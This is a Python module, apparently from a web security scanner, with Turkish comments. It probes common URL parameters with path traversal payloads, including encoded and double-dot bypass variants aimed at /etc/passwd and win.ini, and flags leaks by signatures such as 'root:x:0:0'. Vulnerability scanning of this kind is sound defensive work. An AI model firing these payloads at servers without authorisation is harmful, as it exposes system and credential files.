"""Path Traversal probe — yaygın parametrelerde `../../etc/passwd` tarzı sızıntı testi.

Kanıt pattern'leri:
    - Linux `/etc/passwd`: `root:x:0:0` satırı
    - Windows `boot.ini` veya `win.ini`: `[fonts]`, `[boot loader]` bölümleri
    - Apache `htaccess`: `AuthType`, `Require`

Her parametre için tek test paketi; içerik indirilmez, sadece ilk 300 bayt kontrolü.
"""

from __future__ import annotations

from urllib.parse import urlencode, urljoin

import requests

from pentra.core.web_probes.base import WebProbeBase
from pentra.models import Finding, Severity

# Yaygın kullanıcı-kontrollü yol parametreleri
_PARAMS_TO_TEST: tuple[str, ...] = (
    "file", "page", "path", "doc", "folder", "root",
    "include", "template", "load", "read", "download",
)

# Sızıntı kanıtı pattern'leri — eşleşirse zafiyet kanıtlanmış sayılır
_LEAK_SIGNATURES: tuple[tuple[str, str], ...] = (
    ("root:x:0:0", "Linux /etc/passwd içeriği"),
    ("root:/bin/bash", "Linux /etc/passwd içeriği"),
    ("[boot loader]", "Windows boot.ini içeriği"),
    ("[fonts]", "Windows win.ini içeriği"),
    ("for 16-bit app support", "Windows config.sys / win.ini içeriği"),
)

# Payload'lar — farklı encoding kaçışları
_PAYLOADS: tuple[tuple[str, str], ...] = (
    ("../../../../etc/passwd", "Linux"),
    ("..%2f..%2f..%2f..%2fetc%2fpasswd", "Linux (URL-encoded)"),
    ("../../../../windows/win.ini", "Windows"),
    ("....//....//....//etc/passwd", "Linux (double-dot bypass)"),
)


class PathTraversalProbe(WebProbeBase):
    name: str = "path_traversal"
    description: str = "Dosya yolu sızıntısı (directory traversal)"
    timeout: float = 8.0

    def probe(self, url: str, session: requests.Session) -> list[Finding]:
        findings: list[Finding] = []
        seen_params: set[str] = set()  # Aynı param için birden fazla rapor etmeyelim

        for param in _PARAMS_TO_TEST:
            if param in seen_params:
                continue

            for payload, os_hint in _PAYLOADS:
                full_url = self._build_url_with_param(url, param, payload)

                try:
                    response = session.get(
                        full_url, timeout=self.timeout, allow_redirects=False,
                    )
                except requests.RequestException:
                    continue

                matched_sig, matched_desc = self._match_leak(response.text)
                if matched_sig:
                    findings.append(
                        Finding(
                            scanner_name="web_scanner",
                            severity=Severity.CRITICAL,
                            title=f"Path traversal: `{param}` parametresi",
                            description=(
                                f"`{param}` parametresi dizin dışına çıkmayı engellemiyor. "
                                f"{payload} payload'u ile {os_hint} sistemindeki hassas dosya "
                                f"içeriği (`{matched_sig}`) yanıta düştü. Saldırgan `/etc/shadow`, "
                                f"uygulama kaynak kodu, yapılandırma dosyaları gibi kritik "
                                f"verilere erişebilir."
                            ),
                            target=full_url,
                            remediation=(
                                f"`{param}` parametresi için girdiyi doğrulayın: "
                                "`..`, `/`, `\\` karakterlerini reddedin; "
                                "sadece allowlist'te olan dosya adlarına izin verin; "
                                "`os.path.realpath()` ile çözülmüş yolun izin verilen kök "
                                "içinde kaldığını doğrulayın."
                            ),
                            evidence=self._build_evidence(
                                request_method="GET",
                                request_path=full_url,
                                response_status=response.status_code,
                                response_snippet=response.text[:200],
                                why_vulnerable=f"{matched_desc} tespit edildi",
                                extra={"payload": payload, "param": param},
                            ),
                        ),
                    )
                    seen_params.add(param)
                    break  # Bu param için bir kanıt yeter, diğer payload'ları atla

        return findings

    # -----------------------------------------------------------------
    @staticmethod
    def _match_leak(body: str) -> tuple[str | None, str]:
        """Yanıt gövdesinde sızıntı kanıtı var mı bak."""
        snippet = body[:4096]  # ilk 4KB'de arama yeter — dosya dump değil, kanıt arıyoruz
        for signature, description in _LEAK_SIGNATURES:
            if signature in snippet:
                return signature, description
        return None, ""

    @staticmethod
    def _build_url_with_param(base_url: str, param: str, payload: str) -> str:
        """base_url'e ?param=payload ekler (mevcut query varsa korur)."""
        separator = "&" if "?" in base_url else "?"
        encoded = urlencode({param: payload}, safe="%")
        # payload zaten URL-encoded olabilir; korumak için %'i safe olarak bırak
        return f"{base_url}{separator}{encoded}"
